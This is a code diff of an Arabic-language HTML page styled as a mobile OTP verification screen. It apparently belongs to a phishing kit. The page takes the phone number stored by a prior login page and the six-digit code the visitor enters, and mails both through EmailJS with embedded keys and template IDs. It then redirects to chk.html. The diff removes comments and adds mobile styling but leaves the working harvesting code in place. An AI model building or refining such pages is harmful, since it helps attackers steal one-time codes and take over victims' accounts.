@@ -8,11 +8,9 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-<!-- تضمين مكتبة EmailJS -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script type="text/javascript">
   (function(){
-     // استبدل "YOUR_PUBLIC_KEY" بالمفتاح العام الخاص بك من حساب EmailJS
      emailjs.init("IwQQtfMeQIkmp7b7-");
   })();
 </script>
@@ -53,7 +51,6 @@
     zoom: 0.8;
   }
 
-  /* الهيدر الأسود مع العنوان وسهم الرجوع */
   .header {
     background-color: var(--header-black);
     padding: 20px 18px;
@@ -150,7 +147,6 @@
     color: var(--text-light-gray);
   }
 
-  /* زر التحقق السفلي بحالة غير مفعّلة */
   .footer {
     padding: 18px 22px 26px;
   }
@@ -166,13 +162,18 @@
     font-weight: 700;
     cursor: not-allowed;
   }
+
+  /* تجاوب الشاشات الصغيرة لتناسب شكل شاشة الهاتف تماماً */
+  @media (max-width: 480px) {
+    body { background-color: var(--bg-white); }
+    .phone-frame { max-width: 100%; zoom: 1; }
+  }
 </style>
 </head>
 <body>
 
   <div class="phone-frame">
 
-    <!-- الهيدر مع سهم الرجوع -->
     <div class="header">
       <span class="back-arrow">
         <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -203,13 +204,11 @@
   </div>
 
 <script>
-  // عرض رقم الهاتف المخزّن من صفحة تسجيل الدخول
   const storedPhone = localStorage.getItem('phoneNumber');
   if (storedPhone) {
     document.getElementById('phoneNumberDisplay').textContent = storedPhone;
   }
 
-  // عدّاد إعادة الإرسال
   let seconds = 58;
   const timerEl = document.getElementById('resendTimer');
   const interval = setInterval(() => {
@@ -222,7 +221,6 @@
     }
   }, 1000);
 
-  // تفعيل زر التحقق عند إدخال 6 أرقام
   const otpInput = document.getElementById('otpInput');
   const verifyBtn = document.getElementById('verifyBtn');
   
@@ -238,16 +236,13 @@
     }
   });
 
-  // إضافة وظيفة الإرسال باستخدام EmailJS عند الضغط على زر التحقق
   verifyBtn.addEventListener('click', function() {
     const phoneNumber = document.getElementById('phoneNumberDisplay').textContent;
     const otpCode = otpInput.value;
 
-    // تغيير نص الزر أثناء الإرسال (اختياري)
     verifyBtn.textContent = 'جاري التحقق...';
     verifyBtn.disabled = true;
 
-    // استبدل "YOUR_SERVICE_ID" و "YOUR_TEMPLATE_ID" بالبيانات الخاصة بك
     emailjs.send("service_ul18hbi", "template_cu1r43r", {
       phone_number: phoneNumber,
       otp_code: otpCode
@@ -255,7 +250,6 @@
     .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        verifyBtn.textContent = 'تم التحقق بنجاح';
-       // التوجيه لصفحة chk.html
        window.location.href = 'chk.html';
     }, function(error) {
        console.log('FAILED...', error);
